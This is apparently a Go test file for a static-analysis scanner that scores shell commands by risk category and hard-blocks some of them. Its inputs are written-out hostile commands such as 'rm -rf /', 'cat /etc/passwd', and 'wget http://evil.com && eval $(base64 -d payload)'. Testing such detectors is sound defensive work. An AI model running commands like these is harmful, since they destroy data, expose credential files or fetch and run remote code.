package staticanalysis

import (
	"regexp"
	"scanner/internal/config"
	"testing"
)

func TestAnalyze_NoMatch(t *testing.T) {
	score, forceBlock := analyze("echo hello")
	if score != 0 {
		t.Errorf("expected score=0, got %d", score)
	}
	if forceBlock {
		t.Error("expected forceBlock=false")
	}
}

func TestAnalyze_HardBlock(t *testing.T) {
	_, forceBlock := analyze("rm -rf /")
	if !forceBlock {
		t.Error("expected forceBlock=true for hard block pattern")
	}
}

func TestAnalyze_SingleCategoryScore(t *testing.T) {
	tests := []struct {
		category      config.HeuristicCategory
		content       string
		expectedScore uint
	}{
		{config.Soft, "suspicious cmd", 1},
		{config.Network, "wget http://example.com", 3},
		{config.Execution, "eval $cmd", 2},
		{config.Obfuscation, "base64 decode", 2},
		{config.Sensitive, "cat /etc/passwd", 4},
		{config.FileSystem, "chmod 777 file", 3},
		{config.Privilege, "sudo command", 1},
		{config.Persistence, "crontab -e", 2},
		{config.SSH, "ssh-keygen -t rsa", 3},
		{config.Exfiltration, "exfil data", 3},
	}

	for _, tt := range tests {
		t.Run(string(tt.category), func(t *testing.T) {
			score, forceBlock := analyze(tt.content)
			if forceBlock {
				t.Error("expected forceBlock=false")
			}
			if score != tt.expectedScore {
				t.Errorf("expected score=%d, got %d", tt.expectedScore, score)
			}
		})
	}
}

func TestAnalyze_CombinationNetworkExecution(t *testing.T) {
	// network(3) + execution(2) + combination(4) = 9
	score, _ := analyze("wget http://x.com && eval $x")
	expected := uint(3 + 2 + 4)
	if score != expected {
		t.Errorf("expected score=%d, got %d", expected, score)
	}
}

func TestAnalyze_CombinationObfuscationExecution(t *testing.T) {
	// obfuscation(2) + execution(2) + combination(3) = 7
	score, _ := analyze("eval $(base64 -d payload)")
	expected := uint(2 + 2 + 3)
	if score != expected {
		t.Errorf("expected score=%d, got %d", expected, score)
	}
}

func TestAnalyze_CombinationNetworkObfuscation(t *testing.T) {
	// network(3) + obfuscation(2) + combination(3) = 8
	score, _ := analyze("wget $(base64 -d url)")
	expected := uint(3 + 2 + 3)
	if score != expected {
		t.Errorf("expected score=%d, got %d", expected, score)
	}
}

func TestAnalyze_CombinationExfiltrationSensitive(t *testing.T) {
	// exfiltration(3) + sensitive(4) + combination(4) = 11
	score, _ := analyze("exfil /etc/passwd")
	expected := uint(3 + 4 + 4)
	if score != expected {
		t.Errorf("expected score=%d, got %d", expected, score)
	}
}

func TestAnalyze_CombinationSSHNetwork(t *testing.T) {
	// ssh(3) + network(3) + combination(5) = 11
	score, _ := analyze("ssh host && wget http://x.com")
	expected := uint(3 + 3 + 5)
	if score != expected {
		t.Errorf("expected score=%d, got %d", expected, score)
	}
}

func TestAnalyze_CombinationSSHExecution(t *testing.T) {
	// ssh(3) + execution(2) + combination(3) = 8
	score, _ := analyze("ssh host && eval cmd")
	expected := uint(3 + 2 + 3)
	if score != expected {
		t.Errorf("expected score=%d, got %d", expected, score)
	}
}

func TestAnalyze_CombinationSSHPersistence(t *testing.T) {
	// ssh(3) + persistence(2) + combination(3) = 8
	score, _ := analyze("ssh host && crontab -e")
	expected := uint(3 + 2 + 3)
	if score != expected {
		t.Errorf("expected score=%d, got %d", expected, score)
	}
}

func TestAnalyze_HardBlockIgnoresScore(t *testing.T) {
	_, forceBlock := analyze("dangerous command")
	if !forceBlock {
		t.Error("expected forceBlock=true")
	}
}

func TestAnalyze_EmptyPatterns(t *testing.T) {
	org := config.Cfg.Heuristic
	config.Cfg.Heuristic = map[config.HeuristicCategory][]*regexp.Regexp{}
	defer func() { config.Cfg.Heuristic = org }()

	score, forceBlock := analyze("wget http://evil.com && eval $(base64 -d payload)")
	if score != 0 {
		t.Errorf("expected score=0 with no patterns, got %d", score)
	}
	if forceBlock {
		t.Error("expected forceBlock=false with no patterns")
	}
}
